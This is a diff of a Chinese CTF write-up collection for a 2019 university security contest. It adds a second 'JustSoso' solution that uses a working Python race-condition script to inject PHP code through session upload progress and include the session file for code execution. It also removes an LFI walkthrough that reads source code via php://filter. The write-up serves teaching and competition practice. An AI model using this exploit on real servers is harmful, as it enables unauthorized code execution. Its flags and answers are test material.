@@ -1,23 +1,27 @@
 # 2019全国大学生信息安全大赛
-本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
+本题暂未开通评论，欢迎来群里交(吹)流(水)。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
 ## 题目类型：
 |类型|年份|难度|
 |:---:|:---:|:---:|
 |官方赛事题|2019|中|
 
-## 网上公开WP:
+# 网上公开WP:
 + https://www.zhaoj.in/read-5417.html
 + https://www.52pojie.cn/thread-936377-1-1.html
++ http://12end.xyz/essay1/
++ https://xz.aliyun.com/t/4906
++ https://xz.aliyun.com/t/4904
 
-## 题目下载：
-+ 暂无
+# 题目下载：
++ 链接: https://pan.baidu.com/s/1Oz3GjZ7oSdjiFHbz29huMA 提取码: x81y
 
-## 本站备份WP：
-**感谢作者：Glzjin、wu1a、warden、lizhirui**
+# 本站备份WP：
+**感谢作者：Glzjin、wu1a、warden、lizhirui、12end**
 
 ## Web
 **作者：Glzjin**
 ### 1、JustSoso
+#### 解法一
 ----------
 
 ![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555771284bf45fb5306dbce9cc5a2b51b7e28f239-1024x669.png)
@@ -193,6 +197,71 @@ index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的�
 11、Flag 到手~
 
 Flag: flag{d3601d22-3d10-440e-84b5-c9faff815551}
+
+#### 解法二
+作者：**12end**  
+
+**包含session文件以RCE**  
+这道题默认没有session，我们可以通过伪造固定session,post一个空文件以及恶意的PHP_SESSION_UPLOAD_PROGRES来执行构造的任意代码。
+`PHP_SESSION_UPLOAD_PROGRES`是一个常量，他是`php.ini`设置中`session.upload_progress.name`的默认值，`session.upload_progress`是PHP5.4的新特征。下面是我本地php5.4的默认配置：  
+![](http://imgs.12end.xyz/essay/essay1/4.png)  
+
+讲一下个别配置的含义：
+
++ session.upload_progress.cleanup 是否在上传结束清除上传进度信息，默认为on
++ session.upload_progress.enabled 是否开启记录上传进度信息，默认为on
++ session.upload_progress.prefix 存储上传进度信息的变量前缀，默认为upload_progress_
++ session.upload_progress.name POST中代表进度信息的常量名称，默认为PHP_SESSION_UPLOAD_PROGRES如果
++ _POST[session.upload_progress.name]没有被设置, 则不会报告进度
+
+可以看到，session.upload_progress.cleanup默认是开启的，这意味着我们上传文件后，进度信息会被删除，我们也就不能直接包含session文件，这就需要利用条件竞争，趁进度信息还未被删除时包含session文件。
+
+条件竞争
+一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计不合理时，将会导致一系列问题的发生。
+
+我们写一个脚本，一个线程不断上传空文件（同时post伪造的恶意进度信息），另一些线程不停地访问session临时文件，总有几次我们会在服务端还没有删除进度信息时访问到session临时文件。
+
+python脚本：
+```
+import requests
+import threading
+
+url='http://127.0.0.1/index.php'
+r=requests.session()
+headers={
+    "Cookie":'PHPSESSID=123'
+}
+def POST():
+    while True:
+        file={
+            "upload":('','')                                                    #上传无效的空文件
+        }
+        data={
+            "PHP_SESSION_UPLOAD_PROGRESS":'<?php readfile("./flag.php");?>'     #恶意进度信息，readfile将直接输出文件内容
+        }
+        r.post(url,files=file,headers=headers,data=data)
+
+def READ():
+    while True:
+        event.wait()
+        t=r.get("http://127.0.0.1/index.php?file=../tmp/tmp/sess_123")
+        if 'flag' not in t.text:
+            print('[+]retry')
+        else:
+            print(t.text)
+            event.clear()
+event=threading.Event()
+event.set()
+threading.Thread(target=POST,args=()).start()
+threading.Thread(target=READ,args=()).start()
+threading.Thread(target=READ,args=()).start()
+threading.Thread(target=READ,args=()).start()
+```
+RCE拿到flag内容：  
+![](http://imgs.12end.xyz/essay/essay1/5.png)  
+因为比赛是下发的docker容器，写shell意义不大，但是的确通过这个脚本读到了flag。  
+这个方法依赖于php.ini的一些配置选项，以及session目录的信息，不过大多数情况下这些都是默认的，很容易可以猜到
+还有更多利用方法，各位师傅们自由发挥。
 
 ### 全宇宙最简单的SQL
 ------------
@@ -708,181 +777,11 @@ Flag：flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}
 
 Flag：flag{79480116-456e-4a90-86e8-4b4b885354b9}
 
-### RefSpace（未做）
+### RefSpace
 --------------
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555860553747f762c9542723801c79081b10360fb-1024x755.png)
-
-1、打开靶机。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558604574dabfc349b4fb1027d4d5aeb1a9a9552-1024x186.png)
-
-2、查看一下源码。似乎开了错误显示。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555860601c3c2e6876feafdc8cf73f407c2a3d652-1024x327.png)
-
-3、随便打着试试，似乎有文件包含。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558607725b7fa827d7bba37a78e90c090ae8e7ce-1024x180.png)
-
-4、访问 /?route=php://filter/convert.base64-encode/resource=app/index，能读源码。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558608400e4d9aa9c020a1695d1f086bdc007bd1-1024x58.png)
-
-base64 解码下，拿到 index.php 的源码：
-```
-    <?php
-    if (!defined('LFI')) {
-        echo "Include me!";
-        exit();
-    }
-    ?>
-    <html>
-
-    <head>
-        <meta charset="UTF-8">
-    </head>
-
-    <body>
-
-        Hi CTFer,<br />
-        这是一个非常非常简单的SDK服务，它的任务是给各位大佬<!--鼠-->提供flag<br />
-        Powered by Aoisystem<br />
-        <!-- error_reporting(E_ALL); -->
-
-    </body>
-
-    </html>
-```
-
-5、再来尝试一下其他文件，比如 flag？
-
-/?route=app/flag
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/155586119349779eca4884fa361e8d6a56df21e24d-1024x160.png)
-
-flag.php 的源码。
-```
-    <?php
-    if (!defined('LFI')) {
-        echo "Include me!";
-        exit();
-    }
-    use interesting\FlagSDK;
-    $sdk = new FlagSDK();
-    $key = $_GET['key'] ?? false;
-    if (!$key) {
-        echo "Please provide access key<br \>";
-        echo '$_GET["key"];';
-        exit();
-    }
-    $flag = $sdk->verify($key);
-    if ($flag) {
-        echo $flag;
-    } else {
-        echo "Wrong Key";
-        exit();
-    }
-    //Do you want to know more about this SDK?
-    //we 'accidentally' save a backup.zip for more information
-```
-
-6、提示有个 backup.zip，下下来看看，是些提示。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555861323c780b1d8aaeb6c6e12b112f3753df6f0-1024x623.png)
-
-    我们的SDK通过如下SHA1算法验证key是否正确:
-```
-    public function verify($key)
-    {
-        if (sha1($key) === $this->getHash()) {
-            return "too{young-too-simple}";
-        }
-        return false;
-    }
-
-    如果正确的话，我们的SDK会返回flag。
-
-    PS: 为了节省各位大佬的时间，特注明
-    	1.此处函数return值并不是真正的flag，和真正的flag没有关系。
-    	2.此处调用的sha1函数为PHP语言内建的hash函数。(http://php.net/manual/zh/function.sha1.php)
-    	3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。
-    	4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。
-```
-
-7、然后来试试 flag 这里，访问 /?route=app/flag&key\[\]=1，爆出一个 /ctf/sdk.php。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555861516bbeb3b61ab497633d6ae926e98b3b869-1024x226.png)
-
-8、来读取一下 /ctf/sdk.php 源码试试。
-
-/ctf/sdk.php 源码：
-```
-    <?php ?><?php //CN: 这是一个使用商业代码保护工具加密的PHP文件，你并不需要解密它。EN: Advanced encrypted PHP File, You do not need to decrypt it.<?php
-    return sg_load('A99ED844A249E2CBAAQAAAAXAAAABGgAAACABAAAAAAAAAD/NITKImzCGI1VR9EIK9uHVUsgvUtMu+SENdmCS1ehX392cUgf5knUyGDxCMj325X7iibxp53EThwzrN/ra9pQEbnXqWWG47SMgMgHSk554rg4E2sxNtl859bWR1SmD7rN2VsgRFl8TTsHAAAAaBAAABfUjHZ7qKwZz4WpMv67AmIzcNoHPMwtJpzi5QgwafCHBbDTvg9VK0uFZGSaIiJ8fTw0lIysz/pdGfajfJZVuS8v4mbmeEulHwIvUqwxHbrxgyu7chgH4h8DGTsolnBj/060yIs5jE49hrcLOLGwYy4BXgsYxuDVG3kXw2U4mjwdk9HoJwy3sTtcQR0oriXaIuEqSmW4GvMeSNxaVcgczCieXoz3VhPx4waUW2YkWfIQLtGiyaCHJiWU8QsUkMWSsjIGDJBbMqHsLIGLwi8KhXemujfi9lcf/hmI4dL8yEfU7WVyVOGefTAqEuJeSJD8cxput1XanBRkTZyCuxVIq0bXjM60X3PFSYFNJ0D6uLkLlK5Z6MalJrgre4wU0eTunFrRoDCJ/wCUDKdcLYHZyaG9LtVTh+OA/3Ap2JEOL31MuZXx+PbY8QT6a1BkmgzhuIHq2D/5wX6Pw1sK8iTjNxjelvkIyLJLWADjHvSCpyxvFLohfsl2TnhpwZtsVsJK/SucocY5g0UjC3n+9mveP65BddLhazeUHopQgmbsvxXUnN9yTKZb9/GQF/RctqADsj/+VbsYeL/jHd1fjQlmH6gpAkBmyDS4o/0TFCGYMGewiFJVuo4u1g6G2ydBtjPUx3mwS/C+/x2VefDP0p5WORQa684LDuVW/21crRxybsSWpbO4A0plcs8q20GEZjEZlPcyqI0MnOBfCPhRLJMzl16YorHA97yNZuU2lXX7PxsBS3QTepAr2YGU/8Mw9p75//Gdt95+h8HgpZVDmwl8AEfqaB46EGc1R4JYtzYCxtjv594oN2rD9BEIGWhdevyeCrjQosate2zZhM7pbxSzxsNZ1NG5SmYHYgA+VQBn0FiL/wsEEO4IS/LWXYL5PL3JQlpcAoMeBZj5ImViHKvDPW8uiUs7Mr/bOH+ildgnKHddncvKbyvzzn/dvy5cmu1RJDVj5VLqsu+EyQ94rOUvbqDZS7qm3B1D7DaUbi3IQjRUkcqv2A2UBnqXNlNxqXQxrHlJ10k+cLZsHbRELd6UoLROCBqj7yyhibeVuZrEIJ6hFWRgSDqyI2SGkuDVfeOMfrBLGBKrGU5PhVC+gpiznnuCqvbWQK29fp6UffvQ75yUPC4Bk9VAWx0RUrSRzgdV1AnU4J136CF8Xy0ubxCHr+4rf/WE2HrxHErJrObdchl2gA6arFvk6OmT7tXUyKm1AvVl57RI26dzq0Gyz38fG/sloVi0eqUzEqpVQPGdY48t+F5I32w3BUPNfYUHOUhiRx0H0i61SWS8gGGOXkK8DmrsUwPoZGeT+F0yor8/aIMklELuwhyKacnHLXgoNh6knCDxVAs6xeyaAWvRRI+PqqWBkQ22SO38utMUMAFpv3L8NQ4Du6bLx7KnGilfXgIWW0Ys7E1K65kpCP/2IT585cVbTx/9J5hTZ0hIjIxsUsquaqvhYLHAYF0QdM6a3Ko8Dgc8aBLh8kx8DxppptOyWq5QshISa3j9aKGJiEdK2dOMGQ1EuOmvIob0VpttgiOPEEGk2TRS3DPydjpA/AuNDfKl3iQOFP8PWn73j2d6iwAcnE2dgcsbBgRuyJKWuf14qyWb3GVgupawMwtpLqdDMWczcCOkJbfqpG7OIymKwBPdSL1zunxmGVJFRnyaHnXld4+TEI62GOWdPjPSZH89MNsCyz7RSji0Ch2l/V+nv4zk6IL4P+FAXsmmTSKUpVxYkNcnAMTHkcpwRj7LugOKqWp5Xy0YT4zRWxbpdPjY8pwcwurc6fxoIgwqU+AvDkWbFp5F6JcztKW/cCD0ieaxtcpAfoB7ZCYZxycPz+ufDFN7qJm7/Wa2KBLOEVDdRPNwqLwnR4GD3yuymGUJ/JeppDOCjZ+80oM3pp2I+N7qKaZzhx3fEr/TGWfO62aVN53AJXIYcGZPrT7+Yy403PDEJBJOkn33WyFzO5EVyTZa9sXVYLqh4MoAwmRjGV2FAaKq5ibSyxVmzysQmBJbY/PPfnt+QA70DLmBk3MrpwLABGCvh0nPw5LKXEjkTD6cUiZSCVPYZxYr5dm/rgiFftMh6eUVjPcL9qgTY1SKyrrvVsCp4UhB7nQZHulGR8ZBUHfYAGxaSsMD0IcGwpQ5RgbIm0PlgM4dbsQWagtvioUBrijiHfHobx7q4yr+xDFwcJbKxBT6WjioiAD5xczDWK7YyoOOjaGcMIyBEKKQtOSJxlZMW3eRRPJkdOwwc5iLkBpvO8jjkuF0DX/QS2ewBPKa1kpv7Vpcun4gSwEAi9YEjcs5kL3SIo3ujPHWad0VDN/LbsjvCYsZ6ljT9hXJlErYXeiVQQfEfnBTbUO9dze4kDhNlbooOXu6DBgKHok2k+y3912w2rMvKmPVVEWYQhTqDvXXOkKBrLOgYRExYZH7+fv8A+0Np+MR4nBlaw9rmR4q/+9/l+tU3Hh35scvNVM51Xj2fG5bgmCmgQUIi/MG5ywTZJ6hEKoxA1935naIGaeZZ/snc8bDJOl1ca94j/ywvkq6KVI+baF2rkcaEtIcSyJzw2ZeUEYHl7Mh3fPB+kHokVkXaKbcjeWcdjxbgoWgk2Yt9HmA2FppQT1HxCtjTjsxpKBY6DJA0kcNJ4NjZz2ULYYI1rt1imDMJ2ZKElGQOczUCjSVSAyzcuwIOZ+t6p/0Gno99DE9jQZSSVxkYzlmzF29BOE9W53CxQiwF37aGg94H9eaWbz+wTqFlbZurdMft30wRxsP77bI9jvhBI3jHEU3wJ06CYVBlOKXZzqQlgBH87Z+CJsf1FAV2lvPtNdoIL0vatrf2KgGlTLWsX7/+t3gyVzAyATd+RWEzCtwqvgXvRmZhXAruHgFK4CFSd6nBIQTAUV1zRfikY7A4mBeyaAIMNBTQ8V80t4eIESCjhl48u4JUw1OzZomsYv0TO626AapkWadZLVP3GZCj+O07W6trGp0h3fed3eCJdgPgB5HdJygHkVULnzQHYLvwvlsU0B6gknvwdbPuWBl4Fh5fJuzKmZTtWpHRm++xZC0gmS0K0chyWcQnRgMrEU0TiqgUkzJCgoVa7rWFWNNE/X3BtKuxlIts4WYXfAKHjErR2p7abE7UY7aJGu82V6wflQ6Vg81WVFDbK7XFPuDnCjxWerWsGKtnDfpvvhBKEV4NJ7F+vPhz801YS6o+9qb11QF4i6xiS1wOBrHarcQETjlPp9JRYmlqdGAaq9ROvbvu1jg/K+Lz+uf8aWxUI1uOafr1ZQahINi5bE6GiS4wNBoCRDvWN0sDT/EY2F3SnA5h42gl/ucZHkW2obBkgU1HLJNJRbxMwA8+McOotG9sTIse8KggjFGvOeLeFI+XgR5i9SIBBEOXuV/1yC3OE4Of0e7zhy5/8HG1Zczhvm7tNf8JJwXXxHd3Mx5yIAHaaf3zEL1/GN7gYizwZX+BZzNrPJVB6lXS6qvYuF6G3twdwJ4pn/O30xiv/36MXuT1U4U4VS+emgf0SPB5v7s2Xsm3ko86RwNpljKDGkeqVLoIhGQBMYBlsOBL2NR/EbBo03OZ2cjg2z7KPjxAZvpOtC61ODP6A4uX/bw6ZTGQjnM2ksgazhsAqou1qb06QHnSh8DhCInkXk/SWGxM0kWb30EcfWWm0rdm0eIBAgoolpJqchVhY2uetY36OVJ5e+z3UzRbXagbfSJxWPxTuXKivvoZq8lzKd4qJ2PNVW7w5AAIdDD0nqQnvhx60cArwvBv/G8Swr/3yzI4KT6PwudqtjOqxXTPv+qKwmil9S+bAeYG/n6rdAxQK5IGxCiM2gFNQ0QHuce+m58DlteYQ7iwu22qv/Ew6eECfXjLJ5oIK+QVeld/YJf5jle7u1qxPKOrYaiBqrhzmrnPxg80oZ56Hj4AV/b9U1JIz8qG/e6jp6w27TejjTfrLYAFzjt88PYj3tTLsQhAfw4PiM4JyQmzZcTsHrt4G6RBhStvrPJemsuE4TrGN2nGM4TD1ynDuo3gcfpC4PU5lRk/+wmNNhgBriLbAbtVU0+YM6Vnzyf57nl7LYeJQkw/6PxGYob0vv39GVEe2WGqHMdg5DwcBldn+qHCWnL967BPBJV9wdMKDiVzy/UlwtV26Vt7Ns+/DCMWXkhiUQmXEXZIiJZOPuevfMfmeCRiy3MgCHmYgN4zSRcj2hCwlkiQQOiwcqEH5yEdLj7YEN6XPor/Pp8ikjA+D4O1c6xntLYkkJHKSCuOJF8HAcxQwrHHJelOrxCo8SPShBDdMYE5/nFoVzYt+RdCiHV+sn8SM7X81CqftGcAj6eMF8LhV6nh0HSbhD+aw+HSt8Yn7Z02jdS7DDRfPHcGVokO5VJx+0WoxdHSbiSYGZ166ocLAx9dT7oVfPk3N9yDT96xA0e8elqxBWTlxkZiANgPBKa6G9PHzJoDAm3eULNl3qqhTOzOLOXcvEkNU11oKZqncco/xtDgvyLnZ5uFUSAKf1sChR93F1mVw5JRbwvkcinrN6pFw2ZnuKlP32FfcH7kVXIMjs1JUQwCfJkyXYtz3DCMbzfk7SX85jmOa3UFK0tHZ4FCKpjUuxOXG1pgrhus9JIRuCHfJNof56qRDbaCYOBAjfyOnMukiOLAfkRoMzHqqDbH/De82f42ILIIvlqHNK2bcpgsiZ6/qlWZU5qU55ngQpfaSv3UWCjYyF3t9gWUNRAwNyRRzhrOvKC4N6zl8/Qj4SDLHxf2jCr5BsQ5pDbzjPp2e9czLHfSg+622lA2D57+svQhcbTVVz9hCjkupJMnOdI6WWk7aIHl9palTmR5ak5d2MSHqJ+gkzuZ6Dsa3mMmgR+xaXq9Dt/zmxHMUzoTgDMMlbbePbCNKHRZQwzVNrhHDw4c1q89rUwz7RSG36katGO/PPhXrV6R9+mqKQ50z63Ebh0Hh/GDOUCkapwF55jzLhszsnOQMJ6WX3Po2+Oh5BA0LFmht5r8MiTinsUQw7pGL9CNC6PzizC4LuHw50JWiXWU/1LVRAf3rqQRdE34YK6/LbfRidb0PfM2clRgIZ2i5RbqORYedqhLo/BsietUYDOWsQHSofoyNXYJGHdhfyGMZXUZTFoBPrqvV/G7xh3v4lhpd+CXmMz/iJl5/TrexAujt6iJFd38uuD1gCEV30qneZbebxxYBqb2IsANBWdTFecSV3tGgqOM2A1vBC9bb+GRO+FUjWyDO89Z1jT1IiBs50+jESEs6t5RosQIEqv9RWVxDhPcMBqZD3sXbsG7nTEdwCxnL2tUIOcexjwtI1juRLLiFlFax4bK2md5Zm8/AjWL0Y60SCoXqOGjZe+SKsP2ip5Imcv9XHaEshOA4sSvNTRBV4gJAdlBx0Ltv7BNKQZ3/dbDwt5wnubs2YOTZvg3NsHRTtm2dDhGzqJfkBJ4K3B3invNccUTK8EUzuMF9aajXQ0jDph47E5y6PyzMe/AC39249hbNw0k1B2yOeBB0EjlefDiiLzkiNYX17x0aIyVWY1h75Nbv063NZx3lAa9TpUDmHgpkWB9SlOKegFC3xLaEmCRu9kNQ8Yb0jymZxvKKXm6dmzYUVMxIrb/MlcxFoPO7N7w72jYBTCdTloXWFs3FHFxQBbqMJvgfxzfo2WcEgAAAB4EAAAdNPClk2hsHqLVRIOkGbe1IfGP4O1oKNAor66lI2c+Kkf7XjY6o8GKWbbiKCeICFxQWUgC1sYTj5+jnFVzFYYDgcYXEjUrEVlJoJsw4rBuTyFB4s6S1OKJa4Gk1ivLTvte5exUEDqbTlo/F08g1KupP5dOAbmJpj9zJqm66i/egnj4r1J1VR1RdENY8K4J7tXGjgLNwIQaoNXt7Gn3nm/agxVlzNqaoWeoSaoNZLJjMf5e0XRhaLUhFAdw9NYUmfG3Ugt2rM72LKVB4HNk8o/Pp+MoWEKkPCEhuRGluV+ez9uRXCABEazw3+jD56+W0DcEOi4lq2lth+QL4y254nS5Wu9lkSLxb/pFijEG/H8KfnEdG5txzPpdS8ZjT3FdEHxB1LiNTZ1k5oKcMs2Lby+/kJSjw1fvjxm538bVFRdmowM86NFo0Q2Y1H18zV8nZw4ki/IkvxkcnlibTersaUCVh7e50AGHV5N/xlrTuV5nNqJXq/t4nsJvxQHDKjHul/d62tLOnz4vNt19haoHSfpJqLuUfCHCtpKGYKPFMAaDwtoY56MqRhacEaEzrAh9hu4uMzYv0bMvBpm/wam9z1NXlNrSG/+OUJV0b7yaHNNMkXCbI5YwSUVFh8axdXZvyVYyq4yuPrbJYj1A+6ERxxl9McgjyaJ+cvueZe8535bwCbiax3c8khXpIpCX+Qgj3SwE+8fyHtxSPSqjXpo+Rgs+FYiLi9g+tQVcWDK1sjeYaHslkUeBlz+5i34M9qbBnuL2l7E9GGI43WFkoTq9hDvsSkghoWSfFiaz2X9emDnC6Oug0OHmD9mPMHZhUJ+dQceuv4yIntSvS6a4B8eZ6ftQ58UtxR7Y1jIN+uz7Se01jHBtvHUKoibob59QPpQXfY/8be6hRqswT4xiBsYUowBTcWjLRdVEW2YTmkuIHbWLhJpCRJOP3raHqpPq4bDxb+eK/Po1SVLg6kCSMyLp62Vz+2QPSFGVEw8QuwZgc7PGJy8oEb9NYAhJkNMAfUxCZJV/vk8UYGnVj2ZbBKb8wv6LWJ6SM/DFrN+S1ub8GceUL8Btsklq8veaFe+l+arnVnSTPorqzl427Q6FjPgL6dahRMb7sSBN1Us1V9KC2zZlqrs6qrylYQRME7uuehGxLNrCc8UDTy8vunSrUdwsELEluYquNLY8VCGoEDVLG3v4QDk+il0m44N5bCt9Hs8wZuZRQxs+UDHltmn5R0CJ0Lc+QgWMYMAJxBgcA4zMFZce9XH/e7IR+04CUHi4uiRhNfDXsSivuoA9eR3cr5vSQ4JQ3YxWpBCt13nlaiI1nypYboV8mUyeTE0deYOO0Uy1bwWDsDKGqNDaa6dq/tbkn6yP8d8PL6K2pteUPaOLZcn6WQH33QtdGYakQgoB9bfIVfSmXfQtLpc2EujQJTkOMAqtbiRCeT9SsK2C/LV8gHr8zsxPfPJW26FRi3cqXPQvLvfh8aYsuZcMDnJjzWY/cMVXz2NkmLaGi3UgplhRd67TV9d4ifMY7WHIkDW1EBWFJaVpctTQ13rz3fOB/roFlZg8Iz/AMb6vislz8Y6ShDpfDx1Tbla3se7S85WCLDT95RVEH/cqYqXjh6xzCqwcO27gF/oqbJSmDXWeO8GmvE7rYdaX7jEHQrH67iSklH/D0yBn/bB5vzeTUd07lx+Maj2YWThGsrw+v418SuwejPGCBTSRO3Mhd30oJuYz2Vbq3ASt7oqjFiBMpWNZ9Go7DZCUiPeuybduMNhI6dlSQqcy1C43/dWzOHsIllo2XTHT1HnNTgFdqAjTGJ1CFNPI0mvpNpIfVJMVD5UVmwUz1DietFq1w79iid/PciSwaZQURdclYOHvnCGF+Qc8UF7arB+9hH9W0/N4kMouTYcY3sYSrC7Zo4DZYg/OyBh0PNJg7ctQxvVo8mmT8fo4EcREnkDn24nKCWjN19YqBZDE17DYBG5TkkWdyFT3YwFdHClRlfgdPFrheV1Ptm/cM6rW2yLVcSuVdoqXIzC1igbeFF8EUC4IGO2yido0GLP7/5VoPbz36gkLg5Ezj8rabWX4ZsZfXRDTGZ33J0caXD8SYUsnWowBHZl+KKHsuGYZfD62466QxYJFxDz/T+7C1oHsPc767WAC+0lGP3fqBJGMd0sIGhIDiMRKhmq2A2AZSBOpE06AlKOskJI99GLfFlkyoTMFuBduUqv0154Lf56LcIPAvYpZ/W2869F3UdFUS7hzt7Rya1xh5SBZ1CBAB8GA8Z5bIIizQzvlw2Loe2kHxw9uq0+VsyP5QDcBEf3xKukTtpPyQjQT4ar7IbM5JKrj4IRyuIIDy42fb63PR72CCG0Dr8DU42qOqQShz8d4/5wXbGqc/q/OrkPokwkG1nQrjh0/mEKrTDK1QjFxM6rMVSgBL0V/ZiinK7shVOKo2CdpFduKT4onH7S2vwS9QB15oTkdHEAyvd8SDRYa4nPrlX3mk4HB2ByXNfX+hi3vGt6G8/mOC5Zuy+aKpgGKV660bQtzO6Ptyny33qtJ4Du/W85hNgaQks0pThyLF86It/I97KPRcTdyNM9Ja9u359cCWCDm41HU1mtsvu1JSX2HxY5naHF79e4wK/J+47JvvDHq5psnDekfcKMm7G9IvQ1SBsp1AhOdLj13nRvZq36d8iIvgLFYpXOtY8y/jXVT4CcipnNj+CF1BVNcgwlBAlrWQpPtOtzYeq4YYgRdPcCYQ2J0MXw46qVQvcPrMwkArkj9zVfCTC7kHx8+SOUGk/bovXayqmmgOJEs9fODb4iag/ss+jchSG/s4ZYZt+gbg2ecsFUStkUtpRSmNkCNK0QHrxJbk9kG/BKoPJPk5uE7cqPmY1XJiGrO/DnFxjxo+0TUufUk51byC+pewwKqoCsceOx9YW861fx+HP/IDKoSkxZdMRW/tAaQnBbAG1YNeEEejtwG/QLvY3SNnaUnrjHHjlbQyijDviIA81lRs6L/kIpg0UedNdfi+RN4Bs0LcvlSaBfzhs7U9oEenc4bkAF0VOlUyaU0wcog9dzRyu0VPEblg2QyrMPgi5OfeeiP1R17h8hk2xD8bwhRxSbDsx+zZ1pdnDbLvx7x7rsTLad1GLGxmBuurI+crgYRAPVINcSasBWhEDrrbUzsu6h7WAv9CgP81Oca7fQmeLV/B4sNTEThx6SAE+mbdgvYNGs2AuBtZxoDnEQPK+11WQ62yO9dImKRanrIGJdCWh8HJoPJUgzORY9Hq3LCEaNTADx8QvhKQyVO3Vj/UeXuSMQDqdP6VGnzT6ylQ4IlJfIav3TRLA+rnaiGiUfZoTe0puVHYsSwOblRJ3YKvdpaF0lQKJRwpeXobw+2DikW+L+ubv4Sqj2cRjn7SuvGio2ga3CWXpEoQSwJEWs9g71HHWmM5virKAoecGBbPIjG+bfQAXDzQVT6NROFr0/Ol1WZRtKWez8lDKUBEebDz1+xmmAejw/eTKusmblMxBoucvK/CNHnu8osGJOknhGht7KVHu5wNbLyVH9K9l7E2Ng1WHFkoMCniRMDqjpond9q16gTgquWv+RDoU/0qaf6UBWuyZUThgLp3rTblGYH2sIrPQxhk1L3W5R+lAzuP/qLyH1498tfONQkk1CFGeqTtdZj6IDWjTF6pKZj8xF+k/HSdHsbIfPBM9o/4fE3zjRtysSQsDFImgUBQQnlOLx/q4wDNClnWO4gxGD7dS9SVN6sJrURfkLxDrGqf+2KtZS/HUlyq8zs1GgIfwcZ0Z90oPE2iZtL8IyW21z1D9rEkQeNiOitPcZSxDh+oOiJNbkqvDW2VPimBDIrYscxXZ/2LhIvmRKzBbznmmmR+S9PSukCzD4jSp8qqxZzyaHMwXvaLUJ6b0rm1wHcNp2lBfbi280fVlGc7daqoQCkKFaSdlJw76YqbpQywoQS+QaACcP4BlvoBtax5p4vIl/U4Pbvo0Vow1OlD5AGslY2rha1uEt5iIDFgQ0MPyczB/8YsPNoEzLdQmCXAMQMB/iRXx8pZdlOaISP0aFW0AaqEsVwDiQKI+2cJn9MZ+GHO0fRPs/ASgFq+kCuHC6Bt8D9RuwnfhQhET2uWCBitAWPs6Tk+hg4UbC2e8rKCmPQv3i8+wgMQMxHRJ6yx2u1jLOaErNKDOTNyRm+INGXuYoWNk2TVNdAJOeIemSmHhMTL/I50OtYeaSnetFfOy5HKQ+sDjP8YOBvHs++W/nDjveVbHsI9cWlcvMOJ1ixC7jCMBAEIn5Ab5A9y6KNTi6KdWgJGYr5nsJc8FDjWo5eEtq71jn8K9UaUvbMdHLBzsph2b+T7CWvg+DkaQLta2n8Tb+ztdkDeBoBrxd9wRyPQsxIUcraMMv/JBeW+cXkwD/cdXKV5IsK7V/n2vFiOiH09XY3jCISSRhQYvegv9yn7CShylE4e79Vv86M5i+PIl8KUDkVl/RFWmAJ8CKY7vh/eswyWeXZnuBta8n3s/MgXuMbtoC1kBv5HumP6izS9UzocSy2iAX8idavTvwAtJnFGkMblg8aJFE1d3+z6LC+NEEh8eedDBbU0a7UpVu00Zm2ii1gO44qiPDJkduCsC/UaOMrbZ8eUFqeMKaZ/Xhdk1yNC7oy/tBFpunchW29xRl4Us9Z4RuKxm1/jP615a//ed6GZ/Knn057IU6dc77dI5DWtuL77foVV7z4IOrNSg00h4/uGi8DrRxRugFHvHHqv42HKI0pAZhhrRS7qtiMO82DQEiClmDdyOJ5tznFVJTYmWoR6yk2VvlJ2D77GAmIvn1VxdP7VIQa+A97ppIJgJneHaoOEcrIwa1QfkwzIcsZ4zyRRWHOqke8GHHRcoNHywCnu1cbHhRxsXUn0SUGVQP0Q+HqxaWZy0VTQhVq7erkr81XLkanlyGmbFqf8wgObMHQKbfRdo0EIyyfBU+7ac2oZgEWo0QktgMlQbX/DUApj0DvSEMFqlahvEkti/JF4JOVGPLk12+G3b3dNji2kNFezybky1jhWR91AoTBhfds+XXvxDKC5Dk7HV8rP9356Wm49A4XCENGxYvgYNqdQupXscu0haZijGbnNfkBka/dzlvLUAHh0piw8tTu2B1tzANUnlZSDSprsUjT98aGSN4Xz/iwDO1LcOXJFJz1iw62DkbW5iIAn992qy7AR04Jgg7JvVezLLPKFYMcTmTO28BTRahinK6z1FWo0H3yVznqkeFDv3k8y9QrePyCl9bfhhHeXLNTkes5Vx6Yxl7eBlgv292SpdGY3CBzzNrZTTNqiQ6/srgOfetEIiOPGkwUgy8FrFVlPtbPkaM57YZS19fQ6Hz2QGjSWyx9rkEzJryNnVIo0PEv7bs+oq2XzhqDohkfUkoxrypieC4ZCOOndR5v/9yrsXFNQxJXVJIZrpaylH00AWg94QNPRHSHwfBFpOYeSsaNGOdNGgjEEIakK2jcRVFOx7xOZVpjzt0uzbiICQ4m3nhLBBdVevcn4NsO4ADQCg+wZLcrVxOsmeRebEuUG1NHgM6YDpOvSZ3YD/sXFrj3Qg7IQ5+XvcrtrvHUHW7yATbQ8qZpbG56Q0FLEBD9HqiLuorcDsqfVG2iU//NLl9Hh8BwjQHcLfQOZ9nSeuSKrMFO6u06gAAAAA=');
-```
-
-9、再来看看敏感文件，robots.txt 有内容。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555861868d25a4beff2c8d27a2a7f6f0eb92b11b5-1024x130.png)
-
-10、有东西，打开看看。/?route=app/Up10aD。
-
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15558619138761b515d42a5a78e66d7f415b903650-1024x239.png)
-
-获取下源码。
-```
-app/Up10aD.php 的源码：
-
-    <?php
-    if (!defined('LFI')) {
-        echo "Include me!";
